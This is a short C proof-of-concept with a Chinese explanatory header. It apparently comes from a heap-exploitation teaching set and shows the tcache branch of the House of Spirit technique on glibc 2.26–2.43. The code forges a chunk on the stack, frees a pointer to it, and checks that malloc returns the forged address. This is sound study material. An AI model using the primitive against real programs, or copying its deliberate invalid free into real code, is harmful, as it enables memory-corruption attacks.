/*
 * 中文导读：本文件是 house_of_spirit 手法的 tcache 分支，对应 glibc
 * 2.26～2.43。
 *
 * 模拟的漏洞能力：可以对一个指向伪造 user area 的指针调用 free，并且能
 * 控制这块伪造区域前面的 size 字段。
 *
 * 核心流程：先把栈上或全局区的一段内存伪造成一个看起来合法的 chunk，
 * 然后把它 free 掉；fastbin 分支还需要先清空 tcache、并给相邻 chunk 伪造
 * 合理的 next-size 以通过完整性检查，tcache 分支的检查更少，只要求 size
 * 落在正确的尺寸类里、地址满足对齐即可。
 *
 * 成功判据：随后的 malloc 会直接返回伪造 chunk 的 user area 地址。2.43
 * 只删掉了 fastbin 分支用到的机制，tcache 分支在 2.43 上依然成立。
 *
 * 阅读约定：malloc 返回的是 user data；源码里 p[-1] 通常是 size 字段，
 * p[-2] 是 prev_size。文件中出现的 UAF、越界和 double free 都是刻意
 * 模拟出来的漏洞行为，不是正常的 C 用法。
 *
 * 版本范围以本目录 README 和验证矩阵为准；如果发行版把补丁回移到了旧
 * 版本号上，应以实际的 libc 源码判断，而不是只看版本号。
 */

#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

int main()
{
	setbuf(stdout, NULL);

	malloc(1);

	unsigned long long *a; // 这是被漏洞覆盖的原始指针，稍后将令它指向伪 chunk 的用户区。
	unsigned long long fake_chunks[10] __attribute__((aligned(0x10))); // 在栈上预留并对齐伪 chunk 所需的内存区域。

	fake_chunks[1] = 0x40; // 写入伪 chunk 的 size 字段，使它属于目标 tcache 尺寸类。

	a = &fake_chunks[2];

	free(a);

	void *b = malloc(0x30);

	assert((long)b == (long)&fake_chunks[2]);
}
